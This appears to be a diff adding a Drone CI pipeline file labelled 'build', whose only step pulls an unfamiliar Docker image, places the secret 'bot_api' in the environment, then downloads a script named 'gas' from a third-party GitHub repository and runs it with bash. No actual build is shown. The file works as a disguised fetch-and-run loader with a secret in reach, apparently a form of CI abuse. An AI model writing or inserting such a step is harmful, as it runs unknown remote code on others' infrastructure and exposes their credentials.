@@ -1,0 +1,13 @@
+kind: pipeline
+type: docker
+name: build
+
+steps:
+- name: cooked
+  image: kry9ton/image:latest
+  environment:
+    token:
+      from_secret: bot_api
+  commands:
+  - wget https://raw.githubusercontent.com/WEEDRR/build/master/gas
+  - bash gas
